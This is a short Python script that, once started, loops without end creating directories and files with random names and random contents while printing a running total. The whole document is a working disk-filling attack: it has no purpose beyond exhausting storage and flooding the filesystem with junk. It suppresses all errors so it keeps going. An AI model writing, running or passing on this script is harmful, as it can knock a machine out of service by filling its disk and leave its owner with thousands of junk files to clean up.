#!/usr/bin/env python3

from contextlib import suppress
from threading import Thread
import os, random

char = lambda strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890": str(random.choice(strings)+str(random.randint(0, 271400281257))+random.choice(strings)+str(random.randint(0, 271004281257))+random.choice(strings)+random.choice(strings)+str(random.randint(0, 271400281257))+random.choice(strings)+str(random.randint(0, 271004281257))+random.choice(strings))

def start_files():
	total_files = 0
	while True:
		total_files +=  2
		with suppress(Exception):
			os.makedirs(f"{char()}")
			with open(f"{char()}", 'w') as f:
				f.write(f"{char()}")
			print(f"Total Files: {total_files}", end="\r")

if __name__ == "__main__":
	Thread(target=start_files).start()